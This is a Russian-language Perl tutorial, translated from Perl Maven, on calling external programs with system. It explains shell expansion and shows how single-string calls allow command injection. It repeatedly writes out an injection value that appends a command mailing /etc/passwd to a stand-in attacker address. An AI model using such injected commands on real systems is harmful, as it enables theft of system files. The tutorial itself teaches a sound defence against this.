---
title: "Запуск внешних программ из Perl с помощью system"
timestamp: 2013-10-22T12:00:02
tags:
  - system
published: true
original: running-external-programs-from-perl
books:
  - beginner
author: szabgab
translator: spidamoo
---


Зачастую Perl используют как обертку вокруг других программ. Другими словами, мы запускаем внешние
программы из нашей Perl-программы.

Наприем, мы используем Perl, чтобы собрать нужные параметры, так что нам будет проще написать нужную
команду для запуска другой программы в командной строке.

Или нам может понядобиться собрать вывод в командной строке другой программы, и затем принять 
какие-то решения, основываясь на этом выводе.

Perl дает нам много разных решений для этого. Мы рассмотрим некоторые из них.


## system

По-видимому самое простое из них - функция `system`. В самом базовом виде она принимает 
текст, который надо написать в командной строке, чтобы выполнить внешнюю команду.

Например, на машинах с Unix/Linux существует команда &laquo;adduser&raquo;, которая создает 
пользовательский аккаунт. Ее можно запустить так:

`/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo`

Так что, если нам надо выполнить ее из скрипта perl, это можно сделать так:

```perl
  system('/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo');
```

Такой код запустит команду adduser. Любой вывод или ошибки, которые выдаст adduser, появятся на 
вашем экране.

Строку для выполнения можно сформировать динамически. Следующие примеры дадут тот же результат:

```perl
  my $cmd = '/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo';
  system($cmd);
```

```perl
  my $cmd = '/usr/sbin/adduser';
  $cmd .= ' --home /opt/bfoo';
  $cmd .= ' --gecos "Foo Bar" bfoo';
  system($cmd);
```

## system с несколькими аргументами

Функция `system` может принимать больше одного аргумента. Пример выше можно было выполнить 
так:
```perl
  my @cmd = ('/usr/sbin/adduser');
  push @cmd, '--home';
  push @cmd, '/opt/bfoo';
  push @cmd, '--gecos',
  push @cmd, 'Foo Bar',
  push @cmd, 'bfoo';
  system(@cmd);
```

В данном случае все показанные примеры работают одинаково, но в жизни эти подходы могут применяться
для разных целей.

## Расширение оболочки

Предположим, у нас есть программа <b>checkfiles</b>, которая проверяет список файлов, переданный ей
в командной строке. Ее можно вызвать так: <b>checkfiles data1.txt data2.txt</b> или так: 
<b>checkfiles data*.txt</b>, чтобы проверить все файлы, название которых начинается с 
&laquo;data&raquo;, затем идут какие-то другие символы, и затем расширение &laquo;txt&raquo;. Этот
второй способ будет работать в системах Unix/Linux, где оболочка расширяет &laquo;data*.txt&raquo;
до списка всех файлов, которые подходят под это описание. Когда программа <b>checkfiles</b> 
выполняется, она уже видит список файлов: <b>checkfiles data1.txt data2.txt data42.txt 
database.txt</b>. Но не так это работает в Windows, где командная строка не делает этого расширения.
В Windows программа получит на вход &laquo;data*.txt&raquo;.

Причем тут наш скрипт Perl, спросите вы?

В Windows это не важно. Однако, в Unix/Linux, если вы запустите программу &laquo;checkfiles&raquo;
изнутри скрипта Perl одной строкой `system("checkfiles data*.txt")`, Perl передаст эту строку
оболочке. Оболочка выполнит свое расширение и программа &laquo;checkfiles&raquo; увидит список 
файлов. С другой стороны, если вы передадите саму команду и ее параметры в отдельных строках: 
`system("checkfiles", "data*.txt")`, то perl запустит непосредственно программу 
&laquo;checkfiles&raquo; и передаст ей один параметр &laquo;data*.txt&raquo;, не проводя расширения.

Как вы можете видеть, передача всей команды целиком в одной строке имеет свои преимущества.

Однако, эти преимущества не достаются бесплатно.

## Риск безопасности

Вызов system с единственным параметром и передача всей команды таким способом может быть угрозой 
безопасности, если вводимые данные поступают из непроверенных источников. Например, прямо из 
веб-формы. Или из лог-файла, созданного веб-сервером.

Предположим, мы получаем параметры для checkfiles из сомнительного источника:

```perl
  my $param = get_from_a_web_form();
  my $cmd = "checkfiles $param";
  system($cmd);
```

Если пользователь ввел в форме &laquo;data*.txt&raquo;, то все в порядке. Переменная `$cmd`
получит значение `checkfile data*.txt`.

С другой стороны, если пользователь подставит другие, более &laquo;хитрые&raquo; параметры, это 
может вызвать неприятности. Например, если пользователь напишет `data*.txt; mail 
blackhat@perlmaven.com &lt; /etc/passwd`, то команда, которую запустит perl, будет такой:
`checkfile data*.txt; mail darkside@perlmaven.com &lt; /etc/passwd`.

Оболочка сначала выполнит команду &laquo;checkfile data*.txt&raquo;, как нам и нужно, но затем она 
пойдет дальше, и выполнит команду &laquo;mail...&raquo;. В результате ваш файл с паролями отправится
прямиком на темную сторону.

Если бы наш скрипт Perl вызывал `system` с несколькими параметрами, мы бы избежали этого 
риска. Если наш код такой:

```perl
  my $param = get_from_a_web_form();
  my @cmd = ("checkfiles", $param);
  system(@cmd);
```

И пользователь вводит `data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd`, то Perl 
запустит программу &laquo;checkfiles&raquo; и передаст ей один аргумент: `data*.txt; mail 
blackhat@perlmaven.com &lt; /etc/passwd`. Расширения оболочки не будет, но мы также избежим
ее опасностей. Команда &laquo;checkfiles&raquo;, возможно, пожалуется, что не может найти файл
`data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd`, но во всяком случае наши пароли
в безопасности.

## Заключение и рекомендации к дальнейшему чтению

Более распространенный подход - собрать одну строку и передать ее функции `system`, но, если
входные данные поступают из сомнительного источника, это легко может стать направлением атаки. Риск
можно сократить, если сопоставлять входные данные с <b>белым списком</b> допутимых символов. Вы 
можете заставить себя всегда думать об этом, включив <b>taint mode</b> с помощью флага `-T` в
инициализирующей строке (sh-bang) вашего скрипта.

Вы можете узнать больше из 
[официальной документации по system](http://perldoc.perl.org/functions/system.html).

